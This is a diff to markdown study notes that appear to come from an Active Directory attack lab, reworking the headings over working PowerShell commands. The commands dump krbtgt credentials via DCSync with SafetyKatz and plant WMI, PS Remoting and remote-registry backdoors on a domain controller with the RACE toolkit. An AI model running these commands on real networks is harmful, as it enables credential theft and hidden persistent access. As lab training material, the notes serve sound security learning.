@@ -213,6 +213,7 @@ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 >Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges
 #### Attack
 ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit: `. C:\AD\Tools\RACE-master\RACE.ps1`
+__WMI (RACE toolkit)__
 - On local machine for student1:
 ```powershell
 Set-RemoteWMI -SamAccountName student1 -Verbose
@@ -231,7 +232,7 @@ Administrator -namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
 ```
 
-Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches
+__PS Remoting (RACE toolkit)__  -  backdoor not stable after August 2020 patches
 - On local machine for student1:
 ```powershell
 Set-RemotePSRemoting -SamAccountName student1 -Verbose
@@ -247,7 +248,8 @@ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc
 Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc 
 -Remove
 ```
-- Using RACE or DAMP, with admin privs on remote machine
+
+__ (RACE/DAMP)__ - with admin privs on remote machine
 ```powershell
 Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
 ```
